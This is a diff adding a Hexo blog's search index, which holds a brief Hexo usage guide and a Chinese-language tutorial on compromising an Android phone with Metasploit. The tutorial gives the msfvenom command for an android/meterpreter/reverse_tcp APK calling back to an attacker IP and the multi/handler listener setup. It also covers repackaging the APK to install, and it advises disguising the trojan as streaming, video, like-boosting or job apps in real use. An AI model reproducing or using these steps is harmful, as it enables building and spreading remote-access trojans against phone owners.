@@ -1,0 +1,82 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>hexo操作指南</title>
+    <url>/2022-11-12/hexo%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/</url>
+    <content><![CDATA[<h1 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;hexo操作指南&quot;</span><br></pre></td></tr></table></figure>
+
+<p>会在<code>\source\_posts\</code>目录下生成对应的markdown。</p>
+<h1 id="创建自定义页面"><a href="#创建自定义页面" class="headerlink" title="创建自定义页面"></a>创建自定义页面</h1><p>同样会生成对应的markdown.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page &quot;schedule&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022-11-12/hexo%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20221112203206346.png" alt="image-20221112203206346"></p>
+<p>网页访问之后默认内容如下</p>
+<p><img src="/2022-11-12/hexo%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20221112203327136.png" alt="image-20221112203327136"></p>
+<h1 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h1><p>先进入到source &#x2F; _post 文件夹中，找到helloworld.md文件，在本地直接执行删除。</p>
+<p>然后依次执行<code>hexo g</code> <code>hexo d</code></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>通过msf对安卓手机渗透测试</title>
+    <url>/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p>环境配置</p>
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>型号</th>
+<th>接入方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kali</td>
+<td>2021</td>
+<td>桥接</td>
+</tr>
+<tr>
+<td>安卓手机</td>
+<td>小米11</td>
+<td>WIFI</td>
+</tr>
+<tr>
+<td>Android Killer</td>
+<td>V1.3.1.0</td>
+<td>apktools 2.6.1</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>实验过程中小米11 未提示风险，(仅签名问题提示非小米应用商店app)</p>
+<p>实战过程中可以对app进行伪装，修改图标,标题,版本，签名</p>
+<p>如(XX直播,XX视频,刷赞,兼职,XX游戏等等)</p>
+</blockquote>
+<p>启动kali后,先查看自己本机IP地址如下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# ip a                                           </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:91:2d:65 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.0.105/24 brd 192.168.0.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 6529sec preferred_lft 6529sec</span><br><span class="line">    inet6 fe80::20c:29ff:fe91:2d65/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后执行如下命令生成木马文件.<br>这里监听了5555端口</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.105 LPORT=5555 R &gt;Android.apk</span><br></pre></td></tr></table></figure>
+
+<p>开启msf后，加载攻击载荷</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置监听IP</span></span><br><span class="line">set LHOST 192.168.0.105</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置监听端口</span></span><br><span class="line">set LPORT 5555</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进行监听</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>这里的apk还无法直接在安卓中运行。</p>
+<p>提示如下:</p>
+<p><img src="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824194539570.png" alt="image-20220824194539570"></p>
+<p>通过对apk反编译。</p>
+<p>网上说修改AndroidManifest.xml 文件.</p>
+<p>不过该文件需要反编译才能查看。推荐使用<code>xml2axml.jar</code>工具进行,该工具可以直接反编译和编译。</p>
+<p>这里我们修改<code>apktool.yml</code></p>
+<p>将<code>minSdkVersion</code>修改为<code>16</code></p>
+<p><code>targetSdkVersion</code>修改为<code>23</code></p>
+<p><img src="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824194807762.png" alt="image-20220824194807762"></p>
+<p>对其进行编译</p>
+<p><img src="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824194910430.png" alt="image-20220824194910430"></p>
+<p>导入手机安装运行之后kali 回显如下内容证明攻击成功。</p>
+<p><img src="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195040373.png" alt="image-20220824195040373"></p>
+<p>执行下命令<code>app_list</code> 查看下软件列表，看下用什么app看<strong>视频</strong></p>
+<p><img src="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195159155.png" alt="image-20220824195159155"></p>
+<p><img src="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195213870.png" alt="image-20220824195213870"></p>
+<p>在这里可以通过? 进行查看命令</p>
+<p><img src="/2022-08-24/%E9%80%9A%E8%BF%87msf%E5%AF%B9%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20220824195256176.png" alt="image-20220824195256176"></p>
+]]></content>
+  </entry>
+</search>
